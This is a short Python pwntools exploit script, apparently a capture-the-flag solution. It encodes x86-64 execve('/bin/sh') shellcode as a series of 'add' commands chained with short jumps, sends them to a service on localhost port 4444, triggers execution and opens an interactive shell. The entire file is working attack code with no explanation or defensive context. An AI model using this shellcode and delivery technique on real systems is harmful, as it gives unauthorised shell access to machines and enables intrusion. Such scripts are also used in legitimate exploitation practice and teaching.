from pwn import *
from binascii import unhexlify

shellcode = [
"bf2f736800",
"48c1e720",
"b92f62696e",
"4809cf",
"48893c24",
"4889e7",
"66b83b00",
"be00000000",
"ba00000000",
"0f05",
]


instructions = ["add " + str(u64((unhexlify(x) + b"\xeb\x05").rjust(8,b'\x90'))) for x in shellcode]


context.terminal = ['termite','-e']

p = remote("localhost",4444)
for i in instructions:
	p.sendline(str(1))
	p.sendline(i)
p.sendline(str(3))
p.sendline(".2")
p.interactive()
